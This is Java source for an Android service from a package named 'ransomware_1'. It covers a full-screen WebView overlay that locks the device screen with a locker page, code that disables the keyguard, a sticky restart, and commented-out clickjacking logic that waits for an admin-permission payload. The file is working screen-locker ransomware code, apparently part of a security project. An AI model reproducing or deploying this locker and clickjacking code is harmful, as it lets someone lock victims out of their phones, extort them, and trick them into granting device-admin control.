package projects.security.ransomware_1;

import android.app.ActionBar;
import android.app.Activity;
import android.app.IntentService;
import android.app.KeyguardManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.support.annotation.Nullable;
import android.view.Display;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.WebView;
import android.widget.LinearLayout;

import java.util.HashMap;

/**
 * Continously Lock the screen using webview
 */
public class LockerService extends Service {
    //LinearLayout locker_layout;
    Intent intent;



    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, final int startId) {
        this.intent = intent;

        Bundle extras = intent.getExtras();
        String path = extras.getString("HTML_PATH");
        int duration = extras.getInt("DURATION");
        String mode = extras.getString("MODE");

        WebView locker_view = new WebView(this);
        locker_view.setLayoutParams(new ViewGroup.LayoutParams(WebView.LayoutParams.MATCH_PARENT, WebView.LayoutParams.MATCH_PARENT));




        locker_view.loadUrl(path); //file:///android_asset/locker.html




        final LinearLayout locker_layout = new LinearLayout(getApplicationContext());
        locker_layout.setOrientation(LinearLayout.VERTICAL);
        locker_layout.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
        locker_layout.addView(locker_view);

        final WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        wm.addView(locker_layout, (WindowManager.LayoutParams) intent.getParcelableExtra("WINDOW_PARAMS"));


        //Unlock automatically, posted below
        final Handler handler = new Handler();
        final Runnable runnable = new Runnable() {
            @Override
            public void run() {
                //LockerService.this.stopSelf(startId);
                WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                wm.removeView(locker_layout);
            }
        };

        //Only unlock if duration specified
        if (duration > 0) {

            handler.postDelayed(runnable, duration);
            //Debug: set password to known value if clickjacking
            try {
                KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Activity.KEYGUARD_SERVICE);
                KeyguardManager.KeyguardLock lock = keyguardManager.newKeyguardLock(Activity.KEYGUARD_SERVICE);
                lock.disableKeyguard();
            } catch (Exception e) {};

        }
        /*
        else if (mode.equals("CLICKJACK")) {

            final Handler h = new Handler();
            new Thread(new Runnable() {
                public void run() {
                    h.postDelayed(new Runnable() {
                        public void run() {
                            synchronized (AdminPayload.sync) {
                                try {
                                    // Calling wait() will block this thread until another thread
                                    // calls notify() on the object.
                                    AdminPayload.sync.wait();
                                    wm.removeView(locker_layout);
                                } catch (InterruptedException e) {
                                    // Notified by AdminPayload that permission received
                                    wm.removeView(locker_layout);
                                }
                            }
                        }
                    }, 3000);

                }
            }).start();
        }

                //Wait till admin is activated, then remove view

*/

        //TODO: change to START_STICKY to restart service after being killed?
        return START_STICKY;

    }

    public void onDestroy() {
        //TODO: restart service
        /*Debug: destroy WebView
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        wm.removeView();
        */ //startService(this.intent);
    }




}
